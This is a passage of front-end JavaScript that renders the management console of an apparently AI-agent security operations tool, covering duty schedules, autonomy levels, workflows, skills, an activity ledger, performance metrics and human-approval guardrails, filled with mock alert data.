    const s=w.sched||{};
    const alwaysOn=(s.mode==='always')||((w.coverage||[]).some(([a,b])=>a===0&&b===24));
    if(alwaysOn) return `<span class="cov-win all"><span class="cov-win-t">Always on</span></span>`;
    if(!(w.coverage||[]).length) return `<span class="cov-win all"><span class="cov-win-t">On demand</span></span>`;
    const range=`${schedHH(s.from)}\u2013${schedHH(s.to)}`;
    return `<span class="cov-win"><span class="cov-win-t">${range}</span></span>`;
  };
  const rows=WATCHES.filter(w=>!w.draft).map(w=>`<div class="cov-row" onclick="App.openWatch('${w.id}')" title="Open ${w.name} settings"><span class="cov-name"><span class="wdot" style="background:${w.color}"></span>${w.name}</span><span class="cov-track ${w.on?'':'off'}">${seg(w)}</span>${winLabel(w)}</div>`).join('');
  const hours=['00:00','06:00','12:00','18:00','24:00'];
  const now=new Date(), nowH=now.getHours()+now.getMinutes()/60;
  const nowPct=(nowH/24*100).toFixed(2);
  const hhmm=String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0');
  const onDuty=WATCHES.filter(w=>!w.draft&&w.on&&(w.coverage||[]).some(([a,b])=>nowH>=a&&nowH<b));
  const total=WATCHES.filter(w=>!w.draft).length;
  const edge=+nowPct<5?' edge-l':+nowPct>95?' edge-r':'';
  return `<div class="cov"><div class="cov-h"><h3>Coverage</h3><span class="ctl-count">who\u2019s on duty across 24 hours</span><span class="cov-live" title="On duty: ${onDuty.map(w=>w.name).join(' \u00b7 ')}"><i></i>${onDuty.length} of ${total} on duty now</span></div><div class="cov-plot"><div class="cov-grid" aria-hidden="true"><i style="left:0"></i><i style="left:25%"></i><i style="left:50%"></i><i style="left:75%"></i><i style="left:100%"></i></div><div class="cov-nowlay" aria-hidden="true"><span class="cov-now${edge}" style="left:${nowPct}%"><b>${hhmm}</b></span></div><div class="cov-rows">${rows}</div></div><div class="cov-axis">${hours.map((h,i)=>`<span style="left:${i*25}%">${h}</span>`).join('')}</div></div>`;
}
function renderWatchesPage(b){
  const sel = state.watchSel ? WATCHES.find(w=>w.id===state.watchSel) : null;
  if(sel) return renderWatchDetail(b, sel);
  const newTile=`<button class="agcard new" onclick="App.stub('New watch')"><span class="agnew-ic">${ic('plus',20)}</span><div class="agnew-t">New watch</div><div class="agnew-d">Define a mandate, schedule, autonomy and skills</div></button>`;
  const act=WATCHES.filter(w=>w.on&&!w.draft).length, paused=WATCHES.filter(w=>!w.on&&!w.draft).length, drafts=WATCHES.filter(w=>w.draft).length;
  const bits=[`${act} active`]; if(paused) bits.push(`${paused} paused`); if(drafts) bits.push(`${drafts} draft`);
  b.innerHTML=`<div class="page-pad">
    ${coverageStrip()}
    <div class="ctl-sech"><h3>Watches</h3><span class="ctl-count">${bits.join(' \u00b7 ')} \u2014 click a card to configure</span></div>
    <div class="agrid" id="agGrid">${WATCHES.map(watchCardHTML).join('')}${newTile}</div>
  </div>`;
}
function watchWorkflowRow(f,curId){
  const surf=f.surface?`<span class="wt-surf ${f.surface}" style="margin-left:8px">${ic(f.surface==='dayshift'?'sun':'moon',10)} ${f.surface==='dayshift'?'NotDaybreak':'NightShift'}</span>`:'';
  const asg=(f.watches||[]).map(id=>WATCHES.find(x=>x.id===id)).filter(Boolean);
  const chip=w=>`<span class="sk-chip wt" title="Open ${w.name} settings" onclick="App.openWatch('${w.id}')"><span class="wdot" style="background:${w.color}"></span>${w.name}${w.on?'':(w.draft?' · draft':' · paused')}</span>`;
  let foot='';
  if(!curId){
    const inner=asg.length?`<span class="ctl-count">Runs on</span>${asg.map(chip).join('')}`:`<span class="sk-none">not assigned to a watch — won’t run</span>`;
    foot=`<div style="display:flex;align-items:center;gap:7px;margin-top:14px;padding-top:12px;border-top:1px solid var(--line-2);flex-wrap:wrap">${inner}<button class="pill-btn ghost sm" style="margin-left:auto" onclick="App.stub('Assign ${f.name}')">${ic('plus',12)} Assign</button></div>`;
  } else {
    const others=asg.filter(w=>w.id!==curId);
    if(others.length) foot=`<div style="display:flex;align-items:center;gap:7px;margin-top:14px;padding-top:12px;border-top:1px solid var(--line-2);flex-wrap:wrap"><span class="ctl-count">Also runs on</span>${others.map(chip).join('')}</div>`;
  }
  return `<div class="auto-card ${f.on?'':'off'}">
    <div class="auto-h"><div class="auto-name">${f.name}${surf}</div><div class="auto-r"><span class="auto-last">${f.last&&f.last!=='—'?`last run ${f.last}`:'never run'}</span><span class="sw ${f.on?'on':''}" role="switch" aria-checked="${!!f.on}" title="${f.on?'Turn off':'Turn on'}" onclick="App.toggleWorkflow('${f.id}')"></span></div></div>
    <div class="apipe">
      <span class="ap-node trig ${f.tt}">${ic(f.tt==='sched'?'clock':'bolt',12)} ${f.trig}</span>
      <span class="ap-arrow">${ic('arrow',13)}</span>
      <span class="ap-node agent">${ic('layers',12)} ${f.skill}</span>
      <span class="ap-arrow">${ic('arrow',13)}</span>
      <span class="ap-node out">${f.out}${f.gated?`<span class="ap-gate">${ic('lock',10)} gated</span>`:''}</span>
    </div>
    ${foot}
  </div>`;
}
function renderWorkflowsPage(b){
  b.innerHTML=`<div class="page-pad">
    <div class="auto-list">${WORKFLOWS.map(f=>watchWorkflowRow(f)).join('')}</div>
  </div>`;
}
function schedFormHTML(w){
  const s=w.sched||{set:false}, set=!!s.set;
  const evOn=watchWorkflows(w).filter(f=>f.on&&f.tt==='event').length;
  const swfs=watchWorkflows(w).filter(f=>f.on&&f.tt==='sched');
  const opt=(v,l,cur)=>`<option value="${v}"${String(v)===String(cur)?' selected':''}>${l}</option>`;
  /* coverage window */
  const seg=[['always','Always on'],['window','Time window'],['demand','On demand']]
    .map(([v,l])=>`<button class="wt-segbtn${set&&s.mode===v?' on':''}" onclick="App.schedMode('${w.id}','${v}')">${l}</button>`).join('');
  const hourSel=k=>`<select class="wt-select sm mono" onchange="App.schedTime('${w.id}','${k}',this.value)">${Array.from({length:24},(_,i)=>opt(i,schedHH(i),s[k])).join('')}</select>`;
  const times=`<div class="wt-times"><span>From</span>${hourSel('from')}<span>to</span>${hourSel('to')}<span class="wt-demand${s.onDemand?' on':''}" role="switch" aria-checked="${!!s.onDemand}" title="Also allow on-demand sessions outside the window" onclick="App.schedDemand('${w.id}')"><span class="sw${s.onDemand?' on':''}"></span><em>plus on-demand</em></span></div>`;
  const slot=!set?`<span class="wt-covnote">Pick a mode above to schedule this draft.</span>`
    :s.mode==='window'?times
    :s.mode==='always'?`<span class="wt-covnote">Around the clock — no shift start or end.</span>`
    :`<span class="wt-covnote">Runs only when an analyst opens a session.</span>`;
  const bands=(w.coverage||[]).map(([a,b])=>`<i style="left:${(a/24*100).toFixed(2)}%;width:${((b-a)/24*100).toFixed(2)}%"></i>`).join('');
  const now=new Date(), nowPct=((now.getHours()+now.getMinutes()/60)/24*100).toFixed(2);
  const ribbonCls='wt-ribbon'+(set?(s.mode==='demand'?' demand':(s.mode==='window'&&s.onDemand?' ondem':'')):' unset');
  const ribbon=`<div class="${ribbonCls}"><div class="wt-ribbon-track">${[3,6,9,12,15,18,21].map(h=>`<u style="left:${(h/24*100).toFixed(2)}%"></u>`).join('')}${bands}${set&&s.mode!=='demand'?`<span class="wt-now" style="left:${nowPct}%" title="Now"></span>`:''}${set?(s.mode==='demand'?'<b>no standing coverage</b>':''):'<b>not scheduled</b>'}</div><div class="wt-covaxis"><span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>24:00</span></div></div>`;
  let covHint='';
  if(!set) covHint='Not scheduled yet — this draft won’t run until a window is set.';
  else if(s.mode==='always') covHint='On duty 24/7 — triggers fire the moment they land.';
  else if(s.mode==='window'){
    const len=((s.to-s.from)+24)%24||24, wraps=s.from>s.to;
    covHint=s.from===s.to?'Start and end match — treated as a 24h window; consider Always on.':`${len}h on duty${wraps?' · wraps midnight':''} — off-window work waits for the next shift or the hand-off.`;
  }
  else covHint='Queued work waits for the next session — nothing runs unattended.';
  const covWarn=set&&s.mode==='demand'&&evOn?`${evOn} event workflow${evOn>1?'s are':' is'} on below but never fires on demand — set a window or turn ${evOn>1?'them':'it'} off.`:'';
  /* cadence */
  const cadSel=`<select class="wt-select" onchange="App.schedCadence('${w.id}',this.value)"${set?'':' disabled'}>${SCHED_CADENCE_OPTS.map(c=>opt(c[0],c[1],s.cadence)).join('')}</select>`;
  const everySel=set&&s.cadence==='sweep'?`<span>every</span><select class="wt-select sm" onchange="App.schedEvery('${w.id}',this.value)">${SCHED_EVERY_OPTS.map(e=>opt(e[0],e[1],s.every)).join('')}</select>`:'';
  let cadHint=set?(SCHED_CADENCE_OPTS.find(c=>c[0]===s.cadence)||SCHED_CADENCE_OPTS[0])[2]:'';
  if(set&&swfs.length) cadHint+=` Scheduled workflows (${swfs.map(f=>f.trig.replace(/^Schedule · /,'').replace(/ daily$/,'').replace(/ \+ on demand$/,'')).join(', ')}) keep their own triggers.`;
  /* hand-off */
  const hOpts=SCHED_HANDOFF_OPTS.filter(h=>!(w.id==='officer'&&h[0]==='officer'));
  const handSel=`<select class="wt-select" onchange="App.schedHandoff('${w.id}',this.value)"${set?'':' disabled'}>${hOpts.map(h=>opt(h[0],h[1],s.handoff)).join('')}</select>`;
  const handHint=set?(SCHED_HANDOFF_OPTS.find(h=>h[0]===s.handoff)||SCHED_HANDOFF_OPTS[4])[2]:'';
  const row=(lbl,ctl,hint,warn,cls)=>`<div class="wt-schedrow${cls?' '+cls:''}"><span class="wt-schedlbl">${lbl}</span><div class="wt-schedctl">${ctl}<div class="wt-schedhint${warn?' warn':''}">${warn?ic('warn',11)+'<span>'+warn+'</span>':hint}</div></div></div>`;
  return `<div class="wt-schedform wt-panel" id="wsched-${w.id}">
    ${row('Coverage window',`<div class="wt-covrow1"><div class="wt-seg">${seg}</div></div><div class="wt-covslot">${slot}</div>${ribbon}`,covHint,covWarn)}
    ${row('Cadence',`<div class="wt-cadrow">${cadSel}${everySel}</div>`,cadHint,'')}
    ${row('Hand-off',handSel,handHint,'','noline')}
  </div>`;
}
function rerenderSched(w){ const host=document.getElementById('wsched-'+w.id); if(host) host.replaceWith(el(schedFormHTML(w))); }
/* ---- watch identity popover (icon + color, anchored to the header badge) ---- */
let _widPop=null,_widFor=null,_widUnbind=null;
function closeWatchIdPop(){ if(_widUnbind){_widUnbind();_widUnbind=null;} if(_widPop){_widPop.remove();_widPop=null;} _widFor=null; }
function toggleWatchIdPop(anchor,wid){
  const same=(_widFor===wid); closeWatchIdPop(); if(same) return;
  const w=WATCHES.find(x=>x.id===wid); if(!w) return;
  const ICONS=['eye','alert','siren','bolt','terminal','sparkle','shield','target','gauge','bot'];
  const COLORS=['#16b3a6','var(--blue)','var(--violet)','var(--amber)','var(--green)','var(--red)'];
  const inner=()=>`
    <div class="wtid-lbl">Icon</div>
    <div class="wt-idrow">${ICONS.map(n=>`<button class="wt-icbtn ${w.icon===n?'on':''}" data-icn="${n}" title="${n}">${ic(n,16)}</button>`).join('')}</div>
    <div class="wtid-lbl" style="margin-top:13px">Color</div>
    <div class="wt-idrow">${COLORS.map(c=>`<button class="wt-swatch ${w.color===c?'on':''}" data-col="${c}" style="background:${c};--swc:${c}"></button>`).join('')}</div>`;
  const pop=el(`<div class="aut-pop wtid-pop" style="width:250px;padding:13px 15px 15px;--wt:${w.color}"></div>`);
  pop.innerHTML=inner();
  document.body.appendChild(pop);
  const r=anchor.getBoundingClientRect();
  pop.style.left=Math.max(10, Math.min(r.left, window.innerWidth-pop.offsetWidth-10))+'px';
  pop.style.top=(r.bottom+8)+'px';
  pop.addEventListener('click',ev=>{
    const b=ev.target.closest('[data-icn],[data-col]'); if(!b) return;
    if(b.dataset.icn) App.setWatchIcon(wid,b.dataset.icn); else App.setWatchColor(wid,b.dataset.col);
    pop.style.setProperty('--wt',w.color); pop.innerHTML=inner();
  });
  _widPop=pop; _widFor=wid;
  const down=ev=>{ if(pop.contains(ev.target)||ev.target.closest('.wt-ptitle .ag-ic')) return; closeWatchIdPop(); };
  const key=ev=>{ if(ev.key==='Escape') closeWatchIdPop(); };
  const scr=ev=>{ if(pop.contains(ev.target)) return; closeWatchIdPop(); };
  const rsz=()=>closeWatchIdPop();
  document.addEventListener('mousedown',down,true);
  document.addEventListener('keydown',key,true);
  document.addEventListener('scroll',scr,true);
  window.addEventListener('resize',rsz);
  _widUnbind=()=>{ document.removeEventListener('mousedown',down,true); document.removeEventListener('keydown',key,true); document.removeEventListener('scroll',scr,true); window.removeEventListener('resize',rsz); };
}
function renderWatchDetail(b,w){
  const GATED_SKILLS={'Alert triage':1,'Detection tuning':1};
  const wfs=watchWorkflows(w);
  const SURF_META={dayshift:{name:'NotDaybreak',icon:'sun',d:'Security operations — files into the morning queue & brief'},nightshift:{name:'NightShift',icon:'moon',d:'Observability & SRE — files into the overnight queue & brief'}};
  const surfRow=s=>{ const m=SURF_META[s], on=(w.surfaces||[]).includes(s);
    return `<div class="wt-surfrow ${on?'on':''}" role="switch" aria-checked="${on}" onclick="App.toggleWatchSurface('${w.id}','${s}')">
      <span class="wt-surfic ${s}">${ic(m.icon,15)}</span>
      <div class="wt-surfmain"><b>${m.name}</b><span>${m.d}</span></div>
      <span class="sw ${on?'on':''}"></span>
    </div>`; };
  const stat=(v,k,extra)=>`<div class="ag-stat"><div class="ag-stat-v">${v==null?'—':v}${extra||''}</div><span class="ag-stat-k">${k}</span></div>`;
  const skrow=n=>`<div class="skill-row">
    <span class="sw on" onclick="App.stub('Disable ${n} for ${w.name}')"></span>
    <div class="sk-main"><div class="sk-top"><span class="sk-name">${n}</span></div></div>
    ${GATED_SKILLS[n]?`<span class="sk-gated">${ic('lock',10)} has gated actions</span>`:''}
  </div>`;
  const ACTM={read:{l:'Read',c:'green'},draft:{l:'Draft',c:'blue'},gated:{l:'Gated action',c:'amber'},auto:{l:'Auto-executed',c:'teal'}};
  const denied=r=>/denied/i.test(r.out);
  const runRow=r=>`<tr><td class="mono act-time">${r.time}</td><td class="act-src">${r.src}</td><td><span class="act-tag ${denied(r)?'red':ACTM[r.act].c}">${denied(r)?'Denied':ACTM[r.act].l}</span></td><td class="act-what">${r.what}</td><td class="act-out ${denied(r)?'red':''}">${r.out}</td></tr>`;
  const recent=(w.recent&&w.recent.length)
    ? `<table class="act-tbl"><thead><tr><th>Time</th><th>Workflow</th><th>Action</th><th>What</th><th>Outcome</th></tr></thead><tbody>${w.recent.map(runRow).join('')}</tbody></table>`
    : `<div class="wt-note" style="margin-top:6px">${ic('clock',12)} No runs yet — this watch hasn’t been activated.</div>`;
  b.innerHTML=`<div class="page-pad wt-det" style="--wt:${w.color}">
    <div class="wt-mandate">${w.mandate}</div>
    <div class="wt-desc lg">${w.desc}</div>
    <div class="ag-stats${w.runs==null?' off':''}" style="margin:16px 0 2px">
      ${stat(w.runs,'Runs · 7d', w.runs==null?'':agSpark(w.id))}
      ${stat(w.acc,'Accepted')}
      ${stat(w.saved,'Time saved')}
    </div>

    <div class="ctl-sech" style="margin-top:20px"><h3>Identity</h3><span class="ctl-count">how this watch appears on cards, briefs & records</span></div>
    <div class="wt-schedform wt-panel">
      <div class="wt-schedrow noline"><span class="wt-schedlbl">Description</span><div class="wt-schedctl">
        <textarea class="wt-descinput" rows="2" onchange="App.setWatchDesc('${w.id}',this.value)">${w.desc}</textarea>
        <div class="wt-schedhint">Shown at the top of this page. To change the icon or color, click the icon in the header above.</div>
      </div></div>
    </div>

    <div class="ctl-sech" style="margin-top:20px"><h3>Autonomy</h3><span class="ctl-count">applies to this watch only</span></div>
    <div class="wt-schedform wt-panel">
      <div class="wt-schedrow noline"><span class="wt-schedlbl">Level</span><div class="wt-schedctl">
        <div class="ag-aut2" id="wdaut-${w.id}">
          <div class="ag-aut2-top"><span class="ag-aut-l">Level</span><span class="aut-h-lv mono"></span></div>
          ${autSliderHTML()}
          <div class="aut-read sm"><b></b><p></p></div>
        </div>
        <div class="wt-note" style="margin-top:4px">${ic('shield',12)}<span>Org guardrails still apply — actions outside the allow-list stay gated at any level. <a onclick="App.openAgentView('guardrails')">View guardrails</a></span></div>
      </div></div>
    </div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Schedule</h3><span class="ctl-count">when it’s on duty, how it sweeps, where work goes after</span></div>
    ${schedFormHTML(w)}

    <div class="ctl-sech" style="margin-top:22px"><h3>Assigned workflows</h3><span class="ctl-count">${wfs.filter(f=>f.on).length} of ${wfs.length} on — run under this watch’s schedule and autonomy</span><button class="pill-btn ghost sm" style="margin-left:auto" onclick="App.stub('Assign a workflow to ${w.name}')">${ic('plus',12)} Assign</button><button class="pill-btn ghost sm" style="margin-left:0" onclick="App.openAgentView('workflows')">${ic('workflow',12)} All workflows</button></div>
    <div class="auto-list">${wfs.map(f=>watchWorkflowRow(f,w.id)).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Skills</h3><span class="ctl-count">what its agents can do</span></div>
    <div class="skill-list">${w.skills.map(skrow).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Data boundaries</h3></div>
    <div class="gr-scopes">${w.scopes.map(([n,c,l])=>`<div class="gr-scope ${c}"><span class="gs-dot"></span><span class="gs-n">${n}</span><span class="gs-l">${l}</span></div>`).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Recent runs</h3><button class="pill-btn ghost sm" onclick="App.openAgentView('activity')">${ic('pulse',12)} Full ledger</button></div>
    ${recent}
  </div>`;
  const host=document.getElementById('wdaut-'+w.id); if(host) wireAutSlider(host,w.id,'detail');
}
function renderSkillsPage(b){
  const skills=[
    {name:'Alert triage',cat:'Detection',desc:'Pull alerts, investigate, classify threats, propose cases.',v:'2.3',watches:['Watch Floor','Watch Officer','Dark Watch'],gated:1,on:true},
    {name:'Case assembly',cat:'Response',desc:'Build a case spine from a thread — evidence, timeline, MITRE.',v:'1.8',watches:['Watch Floor','Watch Officer','Dark Watch','Deep Watch'],gated:0,on:true},
    {name:'Threat hunt (TTP)',cat:'Detection',desc:'Hypothesis-driven hunt across the fleet for a technique.',v:'1.4',watches:['Deep Watch'],gated:0,on:true},
    {name:'Brief generation',cat:'Reporting',desc:'Assemble the mode-aware shift brief from open work.',v:'3.1',watches:['Watch Officer','Dark Watch'],gated:0,on:true},
    {name:'SLO review',cat:'Observability',desc:'Review SLOs & significant events; flag regressions.',v:'1.2',watches:['Watch Floor'],gated:0,on:true},
    {name:'Detection tuning',cat:'Detection',desc:'Propose exceptions and tune noisy detection rules.',v:'0.9',watches:['Deep Watch'],gated:1,on:true},
  ];
  const conns=[
    {name:'EDR — endpoint',icon:'host',status:'Connected',use:'reads · isolate (gated)'},
    {name:'Identity provider',icon:'user',status:'Connected',use:'reads · revoke (gated)'},
    {name:'Mail / collaboration',icon:'at',status:'Connected',use:'reads · rule changes (gated)'},
    {name:'Discover — events',icon:'compass',status:'Connected',use:'reads'},
    {name:'MITRE ATT&CK',icon:'target',status:'Connected',use:'reference'},
    {name:'Ticketing — change mgmt',icon:'doc',status:'Available',use:'—'},
  ];
  const wchips=s=>s.watches.length
    ? s.watches.map(n=>{ const w=WATCH_BY_NAME[n]||{}; return `<span class="sk-chip wt" title="Open ${n} settings" onclick="App.openWatchName('${n}')"><span class="wdot" style="background:${w.color||'var(--ink-4)'}"></span>${n}</span>`; }).join('')
    : `<span class="sk-none">not enabled on any watch</span>`;
  const srow=s=>`<div class="skill-row ${s.on?'':'off'}">
    <span class="sw ${s.on?'on':''}" onclick="App.stub('Toggle ${s.name}')"></span>
    <div class="sk-main"><div class="sk-top"><span class="sk-name">${s.name}</span><span class="sk-cat">${s.cat}</span><span class="sk-v mono">v${s.v}</span></div><div class="sk-desc">${s.desc}</div><div class="sk-watches">${wchips(s)}</div></div>
    <div class="sk-meta">${s.gated?`<span class="sk-gated">${ic('lock',10)} ${s.gated} gated</span>`:''}</div>
  </div>`;
  const crow=c=>`<div class="conn-row"><span class="conn-ic">${ic(c.icon,14)}</span><div class="conn-main"><span class="conn-name">${c.name}</span><span class="conn-use">${c.use}</span></div><span class="conn-status ${c.status==='Connected'?'on':''}"><span class="cdot"></span>${c.status}</span></div>`;
  b.innerHTML=`<div class="page-pad">
    <div class="ctl-intro">Skills are the capabilities watches draw on — versioned, explicit about which gated actions they can invoke, and enabled per watch from that watch’s settings. Connectors are the tools and MCP servers skills are built on.</div>
    <div class="ctl-sech"><h3>Skills</h3><span class="ctl-count">${skills.filter(s=>s.on).length} of ${skills.length} enabled</span></div>
    <div class="skill-list">${skills.map(srow).join('')}</div>
    <div class="ctl-sech" style="margin-top:22px"><h3>Connectors & tools</h3><span class="ctl-count">${conns.filter(c=>c.status==='Connected').length} connected</span></div>
    <div class="conn-grid">${conns.map(crow).join('')}</div>
  </div>`;
}
function renderActivityPage(b){
  const stats=[['Runs today','37'],['Auto-reads','214'],['Auto-executed','12','teal'],['Drafts proposed','9'],['Gated · pending','2']];
  const rows=[
    {time:'09:21',agent:'Watch Floor',src:'Alert triage',act:'draft',what:'Drafted a case — mailbox exfil rule on r.patel',out:'Awaiting review'},
    {time:'09:20',agent:'Watch Floor',src:'Noise suppression',act:'auto',what:'Auto-closed 47 duplicate scanner alerts',out:'Resolved autonomously'},
    {time:'09:09',agent:'Deep Watch',src:'Manual session',act:'read',what:'Pulled process lineage for FIN-DB-02',out:'Auto-run'},
    {time:'08:50',agent:'Watch Officer',src:'Critical escalation',act:'gated',what:'Proposed isolate FIN-WS-09',out:'Awaiting your review'},
    {time:'08:48',agent:'Watch Floor',src:'Alert triage',act:'read',what:'Read DS replication events on FIN-WS-09',out:'Auto-run'},
    {time:'06:00',agent:'Watch Officer',src:'Morning brief',act:'draft',what:'Drafted the shift brief',out:'Delivered'},
    {time:'03:12',agent:'Dark Watch',src:'Mailbox rules',act:'auto',what:'Removed exfil forwarding rule · CASE-2043',out:'Resolved autonomously'},
    {time:'02:41',agent:'Watch Officer',src:'Rollback proposals',act:'gated',what:'Escalated the NightShift rollback proposal',out:'Held for your review'},
    {time:'01:30',agent:'Watch Floor',src:'SLO regression review',act:'read',what:'Scanned checkout-service SLOs',out:'Auto-run'},
    {time:'00:00',agent:'Watch Officer',src:'Overnight brief',act:'draft',what:'Drafted the overnight brief',out:'Delivered'},
  ];
  const ACT={read:{l:'Read',c:'green'},draft:{l:'Draft',c:'blue'},gated:{l:'Gated action',c:'amber'},auto:{l:'Auto-executed',c:'teal'}};
  const denied=r=>/denied/i.test(r.out);
  const row=r=>`<tr><td class="mono act-time">${r.time}</td>
    <td><span class="act-agent"><span class="wdot" style="background:${(WATCH_BY_NAME[r.agent]||{}).color||'var(--ink-4)'}"></span> ${r.agent}</span></td>
    <td class="act-src">${r.src}</td>
    <td><span class="act-tag ${denied(r)?'red':ACT[r.act].c}">${denied(r)?'Denied':ACT[r.act].l}</span></td>
    <td class="act-what">${r.what}</td>
    <td class="act-out ${denied(r)?'red':''}">${r.out}</td></tr>`;
  b.innerHTML=`<div class="page-pad">
    <div class="ctl-intro">Every watch run is logged here: what it read on its own, what it drafted for review, what it executed inside its allow-list, and which gated actions were proposed, approved, or denied — and by whom. This is where autonomy stays accountable.</div>
    <div class="act-stats">${stats.map(([k,v,tone])=>`<div class="act-stat"><div class="as-v ${tone||''}">${v}</div><div class="as-k">${k}</div></div>`).join('')}</div>
    <table class="act-tbl"><thead><tr><th>Time</th><th>Watch</th><th>Workflow</th><th>Action</th><th>What</th><th>Outcome</th></tr></thead><tbody>${rows.map(row).join('')}</tbody></table>
  </div>`;
}
function renderPerformancePage(b){
  const stats=[
    {v:'82%',k:'Proposal acceptance',d:'+6 pts vs last week',up:true},
    {v:'41h',k:'Analyst time saved',d:'this week',up:true},
    {v:'−63%',k:'False positives',d:'30-day trend',up:true,green:true},
    {v:'91%',k:'Escalation precision',d:'confirmed / escalated',up:false},
    {v:'7',k:'Analyst overrides',d:'−3 vs last week',up:true},
    {v:'$214',k:'Agent cost · wk',d:'within budget',up:false},
  ];
  const flows=[
    {name:'Watch Floor',prop:309,acc:269,saved:'22h',aut:autonomyOf('floor')},
    {name:'Watch Officer',prop:58,acc:47,saved:'9h',aut:autonomyOf('officer')},
    {name:'Dark Watch',prop:31,acc:30,saved:'9h',aut:autonomyOf('dark')},
    {name:'Deep Watch',prop:46,acc:38,saved:'8h',aut:autonomyOf('deep')},
  ];
  const rej=[['Scope too broad',12],['Disagreed with verdict',8],['Needed more evidence',9],['Business-impact risk',7],['Duplicate of existing',5]];
  const rejMax=Math.max(...rej.map(r=>r[1]));
  const statCard=s=>`<div class="perf-stat"><div class="ps-v ${s.green?'green':''}">${s.v}</div><div class="ps-k">${s.k}</div><div class="ps-d ${s.up?'up':''}">${s.up?ic('arrow',10):''} ${s.d}</div></div>`;
  const flowRow=f=>{ const pct=Math.round(f.acc/f.prop*100); return `<tr>
    <td class="perf-flow" style="cursor:pointer" title="Open ${f.name} settings" onclick="App.openWatchName('${f.name}')">${f.name}</td>
    <td class="r mono">${f.prop}</td>
    <td><div class="perf-acc"><span class="perf-accbar"><i style="width:${pct}%"></i></span><span class="mono">${pct}%</span></div></td>
    <td class="r mono">${f.saved}</td>
    <td style="--tone:${(WATCH_BY_NAME[f.name]||{}).color||'var(--accent)'}">${autMeter(f.aut)} <span style="font-size:11px;color:var(--ink-4)">${AUT_LABELS[f.aut-1]||'—'}</span></td></tr>`; };
  const rejRow=r=>`<div class="perf-rejrow"><span class="rr-l">${r[0]}</span><span class="perf-rejbar"><i style="width:${Math.round(r[1]/rejMax*100)}%"></i></span><span class="rr-n">${r[1]}</span></div>`;
  b.innerHTML=`<div class="page-pad">
    <div class="ctl-intro">Is each watch creating value — and is it safe to give it more room? Noise reduction, response speed, escalation quality, override rate and cost meet here, so autonomy changes are made per watch, on evidence — not feel.</div>
    <div class="perf-stats">${stats.map(statCard).join('')}</div>
    <div class="ctl-sech"><h3>By watch</h3><span class="ctl-count">last 7 days</span></div>
    <table class="perf-tbl"><thead><tr><th>Watch</th><th class="r">Proposals</th><th>Acceptance</th><th class="r">Time saved</th><th>Autonomy</th></tr></thead>
      <tbody>${flows.map(flowRow).join('')}</tbody></table>
    <div class="perf-callout"><span class="pc-ic">${ic('sparkle',16)}</span><div class="pc-b">
      <b>Watch Floor</b> is running at 87% acceptance over 300+ proposals with <b>zero missed criticals</b> — a candidate to raise from “Drafts auto” to “Acts · gated”. <b>Watch Officer</b> response actions should stay gated: acceptance is 81% and overrides cluster on business-impact risk.
      <div class="pc-btn"><button class="pill-btn ghost sm" onclick="App.openWatchName('Watch Floor')">${ic('eye',12)} Review Watch Floor autonomy</button></div>
    </div></div>
    <div class="ctl-sech" style="margin-top:22px"><h3>Why proposals were rejected</h3><span class="ctl-count">61 rejections · 7 days · top 5 reasons</span></div>
    <div class="perf-rej">${rej.map(rejRow).join('')}</div>
  </div>`;
}
function renderGuardrailsPage(b){
  const levels=AUT_LABELS.map((t,i)=>({n:i+1,t,d:AUT_DESCS[i]}));
  const current=3; /* org default for new watches */
  const allow=[
    {t:'Auto-run reads',d:'Queries, lookups and enrichment run without asking.',on:true},
    {t:'Remove malicious mailbox rules',d:'Dark Watch · 22:00–06:00 — reversible, single-mailbox scope, original rule preserved.',on:true},
    {t:'Block known-bad IPs at the perimeter',d:'Dark Watch · 22:00–06:00 — threat-intel matched, deny rule auto-expires in 24h.',on:true},
    {t:'Auto-isolate on confirmed credential compromise',d:'Skip the gate for host isolation when a compromise is confirmed.',on:false},
    {t:'Auto-snooze low-confidence beacons',d:'Suppress and watchlist low-reputation beacons without asking.',on:false},
  ];
  const gating=[
    ['Run reads / queries','Auto','—'],
    ['Draft a case or brief','Auto','—'],
    ['Isolate a host','Gated','Senior analyst +'],
    ['Disable / reset an account','Gated','Senior analyst +'],
    ['Disable a mailbox rule','Gated','Senior analyst + · or allow-list'],
    ['Roll back a deploy','Gated','On-call SRE +'],
  ];
  const scopes=[['Security indices','full','Read'],['APM · logs · SLOs','full','Read'],['Finance PII','masked','Masked'],['Customer data','denied','No access']];
  b.innerHTML=`<div class="page-pad">
    <div class="ctl-intro">Guardrails are the floor every watch inherits — the default autonomy for new watches, the allow-lists that skip a gate, who approves world-changing actions, and the data its agents may see. A watch can be stricter than these defaults — looser only through an explicit allow-list entry below.</div>

    <div class="ctl-sech"><h3>Default autonomy · new watches</h3><span class="ctl-count">existing watches keep their own level — set it on the watch</span></div>
    <div class="gr-levels">${levels.map(l=>`<div class="gr-level ${l.n===current?'on':''}" onclick="App.stub('Set autonomy: ${l.t}')"><span class="gr-radio">${l.n===current?ic('check',12):''}</span><div><div class="gr-lt">${autMeter(l.n)} ${l.t}</div><div class="gr-ld">${l.d}</div></div></div>`).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Allow-lists</h3><span class="ctl-count">skip a gate for specific, trusted actions</span></div>
    <div class="gr-allow">${allow.map(a=>`<div class="gr-toggle"><span class="sw ${a.on?'on':''}" onclick="App.stub('Toggle ${a.t}')"></span><div><div class="gr-tt">${a.t}</div><div class="gr-td">${a.d}</div></div></div>`).join('')}</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Per-action gating</h3></div>
    <table class="gr-tbl"><thead><tr><th>Action</th><th>Policy</th><th>Approver</th></tr></thead><tbody>
      ${gating.map(([a,p,who])=>`<tr><td>${a}</td><td><span class="gr-pol ${p==='Gated'?'gated':'auto'}">${p==='Gated'?ic('lock',10):ic('check',10)} ${p}</span></td><td class="gr-who">${who}</td></tr>`).join('')}
    </tbody></table>
    <div style="font-size:11.5px;color:var(--ink-4);margin-top:8px">Allow-listed actions above run without a gate, inside their scope and duty window.</div>

    <div class="ctl-sech" style="margin-top:22px"><h3>Data boundaries</h3></div>
